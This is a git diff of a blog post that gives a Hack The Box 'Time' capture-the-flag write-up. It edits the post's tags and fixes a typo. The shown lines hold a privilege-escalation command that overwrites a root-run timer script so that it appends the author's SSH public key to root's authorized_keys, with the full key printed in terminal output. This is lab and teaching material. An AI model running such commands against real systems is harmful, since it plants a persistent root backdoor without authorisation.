@@ -2,7 +2,8 @@
 layout: post
 title:  "Hack The Box - Time - Writeup"
 date:   2021-12-25 07:00:00 +0200
-tags: ["Hack The Box","OSCP"]
+#mainTags: ["Hack The Box","OSCP"]
+tags: ["CVE-2019-12384","Deserialization","Hack The Box - Linux","Hack The Box - Medium","Jackson","Java","OSCP","Source Code Analysis","Systemd Timer","SQL Injection","Wireshark"]
 ---
 {% assign imgDir="2021-12-25-HTB-Time-Writeup" %}
 
@@ -151,7 +152,7 @@ If we check the file permissions of the script by executing `ls -l /usr/bin/time
 {% highlight bash linenos %}
 echo 'mkdir -p /root/.ssh && echo "[id_rsa.pub]" >> /root/.ssh/authorized_keys' > /usr/bin/timer_backup.sh
 {% endhighlight %}
-Then, we execute the command above to place the command `mkdir -p /root/.ssh && echo "[id_rsa.pub]" >> /root/.ss h/authorized_keys` in the `timer_backup.sh` file. This command creates a `.ssh` directory in the `root` user's home directory and adds our public key to a file named "authorized_keys" in this directory. Note that `[id_rsa.pub]` should be the content of the `id_rsa.pub` file we generated earlier, as demonstrated below.
+Then, we execute the command above to place the command `mkdir -p /root/.ssh && echo "[id_rsa.pub]" >> /root/.ssh/authorized_keys` in the `timer_backup.sh` file. This command creates a `.ssh` directory in the `root` user's home directory and adds our public key to a file named "authorized_keys" in this directory. Note that `[id_rsa.pub]` should be the content of the `id_rsa.pub` file we generated earlier, as demonstrated below.
 
 {% highlight none linenos %}
 pericles@time:/var/www/html$ @@echo 'mkdir -p /root/.ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDFoWVw8wEzbTLovM683V9WMByt5lNHDItm6p8rbqemXtJMUEzjzBG+uSTeTfh2xgRVWx+1DWkWZjiwi7I11gagSUAwbf92cwwlbVgF4C18vI0OzjeMhBlO6zEyF06etLcsI+DsSuHmCEL56rvEDIOkFauLYIuKB5JTR8/Uhqb/KlMrKPN6QLni8NOqpraGJYQ7OLhJKTGDcNIqBgVDWDPudqDZDSPhn5sy7TD28CX/x+Y/jRpHqAAhR52T1PKVUDbusLEfA1XBROlONhT+sYj0GVocfb8QYFDQR80exAAz/I9X5Bfo6Z9ncYnZCp3Cq/bgZZRdhjgYxwUfZEZBI/1WLZRyVbjfVkDAjyPgBtmaoLURvYVgFW0vuzbKRNLfMZGBGdVEp0dF+cfx9DkpYZzX/kRx1S5RtWjWwmP/Xq7JmEKRZhQDJHdSquFxqCdZ+aBPCS26xvSAnT/9XJRhjRtEExLAMWIKiS6K+t8kvX+eZEJ2qUX6LPqNy95QZzJghk8= kali@kali" >> /root/.ssh/authorized_keys' > /usr/bin/timer_backup.sh@@
